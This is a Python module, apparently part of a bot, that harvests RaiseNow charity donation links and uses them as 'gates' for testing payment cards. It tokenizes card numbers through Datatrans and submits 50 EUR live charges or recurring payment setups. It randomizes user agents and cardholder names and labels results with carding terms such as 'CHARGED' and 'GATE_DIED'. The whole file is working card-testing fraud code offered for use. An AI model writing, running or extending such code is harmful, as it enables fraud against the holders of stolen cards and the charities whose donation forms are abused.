# multi_link_checker.py
# Contains all logic for the special multi-link checking mode.

import requests
import json
import os
import random
import time
import logging
from urllib.parse import urlparse

# Setup logger
logger = logging.getLogger(__name__)

# --- Constants ---
LINKS_FILE = "dalinks.json"
MODE_FILE = "dalink_mode.json"
TEST_CARD = "5168155124645796|9|2028|462" # Test card for validation

# --- Helper functions (to avoid circular import) ---
def generate_random_string(length=8):
    """Generates a random string of characters."""
    import string
    letters = string.ascii_lowercase
    return ''.join(random.choice(letters) for _ in range(length))

def random_user_agent():
    """Generates a random realistic User-Agent string."""
    chrome_major = random.randint(100, 125)
    chrome_build = random.randint(0, 6500)
    chrome_patch = random.randint(0, 250)
    return (
        f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) "
        f"Chrome/{chrome_major}.0.{chrome_build}.{chrome_patch} Safari/537.36"
    )

# --- State Management ---
def get_dalink_status():
    """Gets the current status of the DaLink mode."""
    if not os.path.exists(MODE_FILE):
        return {'enabled': False, 'mode': 'charge'}
    try:
        with open(MODE_FILE, "r", encoding='utf-8') as f:
            return json.load(f)
    except (json.JSONDecodeError, FileNotFoundError):
        return {'enabled': False, 'mode': 'charge'}

def set_dalink_status(enabled: bool, mode: str = None):
    """Sets the status for DaLink mode."""
    status = get_dalink_status()
    status['enabled'] = enabled
    if mode in ['live', 'charge']:
        status['mode'] = mode
    with open(MODE_FILE, "w", encoding='utf-8') as f:
        json.dump(status, f, indent=4)

# --- Link Data Management ---
def load_links():
    """Loads the list of validated links."""
    if not os.path.exists(LINKS_FILE):
        return []
    try:
        with open(LINKS_FILE, "r", encoding='utf-8') as f:
            return json.load(f)
    except (json.JSONDecodeError, FileNotFoundError):
        return []

def save_links(links):
    """Saves the list of links."""
    with open(LINKS_FILE, "w", encoding='utf-8') as f:
        json.dump(links, f, indent=4)

def delete_link(index_to_delete):
    """Deletes a link by its index."""
    links = load_links()
    if 0 <= index_to_delete < len(links):
        deleted_link = links.pop(index_to_delete)
        save_links(links)
        return deleted_link
    return None

def delete_all_links():
    """Deletes all saved links."""
    save_links([])

def get_random_link():
    """Gets a single random link's data from storage."""
    links = load_links()
    if not links:
        return None
    return random.choice(links)

# --- Core Logic ---
def validate_and_add_link(session, link_url):
    """
    Validates a Raisenow link and adds it to the list if it's functional.
    Returns a status string.
    """
    try:
        # 1. Extract code from URL
        parsed_url = urlparse(link_url)
        cd = parsed_url.path.strip('/')
        if not cd:
            return f"'{link_url}' -> Invalid URL format."

        # Check for duplicates
        existing_links = load_links()
        if any(link['cd'] == cd for link in existing_links):
            return f"'{cd}' -> Link already exists."

        # 2. Get identifiers from RaiseNow
        identifier_url = f"https://api.raisenow.io/short-identifiers/{cd}"
        headers = {"User-Agent": random_user_agent()}
        
        response = session.get(identifier_url, headers=headers, timeout=20)
        if response.status_code != 200:
            return f"'{cd}' -> Failed to fetch identifiers (Status: {response.status_code})."
        
        resp_json = response.json()
        payload = resp_json.get("payload", {})
        
        # 3. Check for "card" method and extract data
        payment_methods = payload.get("payment_methods", [])
        card_method = next((m for m in payment_methods if m.get("method_name") == "card"), None)

        if not card_method:
            return f"'{cd}' -> Does not support card payments."

        account_uuid = payload.get("account_uuid")
        solution_uuid = payload.get("solution_uuid")
        profile = card_method.get("profile")

        if not all([account_uuid, profile]):
            return f"'{cd}' -> Missing essential data (account_uuid or profile)."

        # 4. Perform test CHARGE using TEST_CARD
        card_number, exp_month, exp_year, cvv = TEST_CARD.split('|')
        if len(exp_year) == 4: exp_year = exp_year[-2:]

        # Step 4a: Tokenize card with Datatrans
        user_agent = random_user_agent()
        tokenize_url = "https://pay.datatrans.com/upp/payment/SecureFields/paymentField"
        tokenize_data = {
            "mode": "TOKENIZE", "formId": "250808045911239489", "cardNumber": card_number,
            "cvv": cvv, "paymentMethod": "ECA", "merchantId": "3000022877",
            "browserUserAgent": user_agent,
        }
        tokenize_headers = {
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "Origin": "https://pay.datatrans.com",
            "Referer": "https://pay.datatrans.com/", "User-Agent": user_agent
        }
        token_response = session.post(tokenize_url, data=tokenize_data, headers=tokenize_headers, timeout=20)
        token_json = token_response.json()
        transaction_id = token_json.get("transactionId")
        if not transaction_id:
            error_msg = token_json.get("error", {}).get("message", "Tokenization failed")
            return f"'{cd}' -> Test Failed (Tokenize): {error_msg}"

        # Step 4b: Attempt payment
        payment_url = "https://api.raisenow.io/payments"
        payment_payload = {
            "account_uuid": account_uuid, "test_mode": False, "create_supporter": False,
            "amount": {"currency": "EUR", "value": 50},
            "supporter": {"locale": "en", "first_name": "John", "last_name": "Doe"},
            "payment_information": {
                "brand_code": "eca", "cardholder": "John Doe", "expiry_month": exp_month,
                "expiry_year": f"20{exp_year}", "transaction_id": transaction_id,
            },
            "profile": profile, "return_url": f"https://donate.raisenow.io/{cd}?lng=en&rnw-view=payment_result",
        }
        payment_headers = {
            "Content-Type": "application/json", "Origin": "https://donate.raisenow.io",
            "Referer": f"https://donate.raisenow.io/", "User-Agent": user_agent
        }

        # 5. Handle responses
        for attempt in range(6): # Retry for 405
            payment_response = session.post(payment_url, json=payment_payload, headers=payment_headers, timeout=25)
            if payment_response.status_code == 405 and attempt < 5:
                time.sleep(2)
                continue
            break # Exit loop on any other status or last attempt
        
        if payment_response.status_code == 400:
            return f"'{cd}' -> Link does not support this payload (Error 400)."
        
        try:
            payment_resp_json = payment_response.json()
        except json.JSONDecodeError:
            return f"'{cd}' -> Test charge failed. Non-JSON Response (Status: {payment_response.status_code})"

        payment_status = payment_resp_json.get("payment_status")
        
        if payment_status == "failed":
            # 6. If OK, add to list
            new_link_data = {
                "cd": cd,
                "account_uuid": account_uuid,
                "profile": profile,
                "solution_uuid": solution_uuid,
                "original_url": link_url
            }
            existing_links.append(new_link_data)
            save_links(existing_links)
            return f"'{cd}' -> Link OK. Added successfully."
        else:
            return f"'{cd}' -> Test charge did not fail as expected. Status: {payment_status}."

    except requests.exceptions.RequestException as e:
        return f"'{link_url}' -> Network Error: {e}"
    except (json.JSONDecodeError, KeyError) as e:
        return f"'{link_url}' -> API Response Error: {e}"
    except Exception as e:
        logger.error(f"Unexpected error in validate_and_add_link: {e}", exc_info=True)
        return f"'{link_url}' -> An unexpected error occurred."


def check_card_dalink(session, line, cc, mes, ano, cvv, bin_info, cancellation_event, mode):
    """
    Performs a card check using a randomly selected validated link.
    'mode' should be 'charge' or 'live'.
    """
    # 1. Get random link data
    link_data = get_random_link()
    if not link_data:
        return 'error', line, "DaLink Error: No validated links available. Please use /addlink.", bin_info

    try:
        user_agent = random_user_agent()
        first_name = generate_random_string(8)
        last_name = generate_random_string(10)
        cardholder = f"{first_name} {last_name}"

        # 2. Tokenize card with Datatrans
        tokenize_url = "https://pay.datatrans.com/upp/payment/SecureFields/paymentField"
        tokenize_data = {
            "mode": "TOKENIZE", "formId": "250808045911239489", "cardNumber": cc,
            "cvv": cvv, "paymentMethod": "ECA", "merchantId": "3000022877",
            "browserUserAgent": user_agent,
        }
        tokenize_headers = {
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "Origin": "https://pay.datatrans.com",
            "Referer": "https://pay.datatrans.com/", "User-Agent": user_agent
        }
        
        token_response = session.post(tokenize_url, data=tokenize_data, headers=tokenize_headers, timeout=20)
        if cancellation_event and cancellation_event.is_set(): return 'cancelled', line, 'User cancelled', bin_info
        
        token_data = token_response.json()
        if "error" in token_data:
            return 'decline', line, token_data["error"].get("message", "Datatrans Tokenize Error"), bin_info
        transaction_id = token_data.get("transactionId")
        if not transaction_id:
            return 'error', line, "Datatrans Tokenize Error: No transactionId", bin_info

        # 3. Build payload and select URL based on mode
        payment_headers = {
            "Content-Type": "application/json", "Origin": "https://donate.raisenow.io",
            "Referer": f"https://donate.raisenow.io/", "User-Agent": user_agent
        }
        
        base_payload = {
            "account_uuid": link_data['account_uuid'],
            "test_mode": False,
            "create_supporter": False,
            "amount": {"currency": "EUR", "value": 50},
            "supporter": {"locale": "en", "first_name": first_name, "last_name": last_name},
            "payment_information": {
                "brand_code": "eca", "cardholder": cardholder, "expiry_month": mes.zfill(2),
                "expiry_year": ano, "transaction_id": transaction_id,
            },
            "profile": link_data['profile'],
            "return_url": f"https://donate.raisenow.io/{link_data['cd']}?lng=en&rnw-view=payment_result",
        }

        if mode == 'charge':
            payment_url = "https://api.raisenow.io/payments"
            payment_payload = base_payload
        elif mode == 'live':
            payment_url = "https://api.raisenow.io/payment-sources"
            payment_payload = base_payload
            payment_payload['subscription'] = {"recurring_interval": "6 * *", "timezone": "Asia/Bangkok"}
        else:
            return 'error', line, f"DaLink Error: Invalid mode '{mode}'", bin_info

        # 4. Make the request
        payment_response = session.post(payment_url, json=payment_payload, headers=payment_headers, timeout=25)
        if cancellation_event and cancellation_event.is_set(): return 'cancelled', line, 'User cancelled', bin_info
        
        response_text = payment_response.text
        
        # 5. Parse response
        if '{"message":"Forbidden"}' in response_text:
            return 'gate_dead', line, f'GATE_DIED (Link: {link_data["cd"]})', bin_info
        
        try:
            resp_json = payment_response.json()
            # Charge mode responses
            if mode == 'charge':
                if resp_json.get("payment_status") == "succeeded":
                    return 'success', line, f'CHARGED_50_DALINK_{link_data["cd"]}', bin_info
                elif resp_json.get("payment_status") == "failed":
                    return 'decline', line, response_text, bin_info
                elif resp_json.get("action", {}).get("action_type") == "redirect":
                    return 'custom', line, response_text, bin_info
            
            # Live mode responses
            elif mode == 'live':
                if resp_json.get("payment_source_status") == "pending":
                     return 'live_success', line, response_text, bin_info
                elif resp_json.get("payment_source_status") == "failed":
                     return 'decline', line, response_text, bin_info

            return 'unknown', line, response_text, bin_info

        except json.JSONDecodeError:
            return 'error', line, f"DaLink Error: Non-JSON response from {payment_url}", bin_info

    except Exception as e:
        logger.error(f"Error in check_card_dalink for line '{line}': {e}", exc_info=True)
        return 'error', line, f"DaLink System Error: {e}", bin_info
